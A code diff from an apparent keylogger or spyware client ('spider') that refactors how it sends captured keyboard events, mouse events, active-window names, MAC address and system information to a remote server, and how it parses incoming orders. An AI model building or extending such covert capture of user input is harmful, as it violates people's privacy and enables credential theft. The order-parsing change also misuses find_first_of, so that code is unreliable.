@@ -51,8 +51,8 @@ namespace spider
       MacAddress::get(macAddr);
       std::array<char, 64 * 8> macAddrArray = {{}};
       std::snprintf(macAddrArray.data(), sizeof(macAddrArray),
-                    "%02X:%02X:%02X:%02X:%02X:%02X", macAddr[0], macAddr[1],
-                    macAddr[2], macAddr[3], macAddr[4], macAddr[5]);
+                    "%x:%x:%x:%x:%x:%x", macAddr[0], macAddr[1], macAddr[2],
+                    macAddr[3], macAddr[4], macAddr[5]);
 
       while (1)
 	{
@@ -203,8 +203,14 @@ namespace spider
 		  nope::log::Log(Info)
 		      << "Received: "
 		      << data.data(); // TOOD: Put in Log(Debug)
-		  m_receivedFromNetwork.push(
-		      library::IPayload::Order(data.data()));
+		  library::IPayload::Order order(data.data());
+
+		  if (order.find_first_of("/setup") != std::string::npos)
+		    {
+		      order = order.substr(0, order.find(" "));
+		    }
+
+		  m_receivedFromNetwork.push(order);
 		}
 	    }
 	  while (cmdLen);
@@ -264,13 +270,10 @@ namespace spider
 	    event.processName = msg.sys.currentWindow;
 
 	    // Send packet
-	    rc = static_cast<std::int32_t>(
-	        m_sockData->send(&header, sizeof(header)));
-	    if (rc)
-	      {
-		rc &= static_cast<std::int32_t>(
-		    m_sockData->send(&event, sizeof(event)));
-	      }
+	    std::array<std::uint8_t, sizeof(header) + sizeof(event)> buff;
+	    std::memcpy(buff.data(), &header, sizeof(header));
+	    std::memcpy(buff.data() + sizeof(header), &event, sizeof(event));
+	    rc = m_sockData->send(buff.data(), sizeof(buff));
 	  }
 	  break;
 	case SystemMsgType::EventMouse:
@@ -286,13 +289,12 @@ namespace spider
 	    event.repeat = 0;
 	    event.shift = 0;
 	    event.processName = msg.sys.currentWindow;
-	    rc = static_cast<std::int32_t>(
-	        m_sockData->send(&header, sizeof(header)));
-	    if (rc)
-	      {
-		rc &= static_cast<std::int32_t>(
-		    m_sockData->send(&event, sizeof(event)));
-	      }
+
+	    // Send packet
+	    std::array<std::uint8_t, sizeof(header) + sizeof(event)> buff;
+	    std::memcpy(buff.data(), &header, sizeof(header));
+	    std::memcpy(buff.data() + sizeof(header), &event, sizeof(event));
+	    rc = m_sockData->send(buff.data(), sizeof(buff));
 	  }
 
 	  // Send mouse move event
@@ -303,16 +305,12 @@ namespace spider
 	    event.posX = htonl(msg.sys.event.posX);
 	    event.posY = htonl(msg.sys.event.posY);
 	    event.processName = msg.sys.currentWindow;
-	    if (rc)
-	      {
-		rc &= static_cast<std::int32_t>(
-		    m_sockData->send(&header, sizeof(header)));
-	      }
-	    if (rc)
-	      {
-		rc &= static_cast<std::int32_t>(
-		    m_sockData->send(&event, sizeof(event)));
-	      }
+
+	    // Send packet
+	    std::array<std::uint8_t, sizeof(header) + sizeof(event)> buff;
+	    std::memcpy(buff.data(), &header, sizeof(header));
+	    std::memcpy(buff.data() + sizeof(header), &event, sizeof(event));
+	    rc = m_sockData->send(buff.data(), sizeof(buff));
 	  }
 	  break;
 	case SystemMsgType::Data:
@@ -338,16 +336,10 @@ namespace spider
 #else
 	    info.ram = htonll(infosPtr->ram);
 #endif
-	    if (rc)
-	      {
-		rc &= static_cast<std::int32_t>(
-		    m_sockData->send(&header, sizeof(header)));
-	      }
-	    if (rc)
-	      {
-		rc &= static_cast<std::int32_t>(
-		    m_sockData->send(&info, sizeof(info)));
-	      }
+	    std::array<std::uint8_t, sizeof(header) + sizeof(info)> buff;
+	    std::memcpy(buff.data(), &header, sizeof(header));
+	    std::memcpy(buff.data() + sizeof(header), &info, sizeof(info));
+	    rc = m_sockData->send(buff.data(), sizeof(buff));
 	  }
 	  break;
 	default:
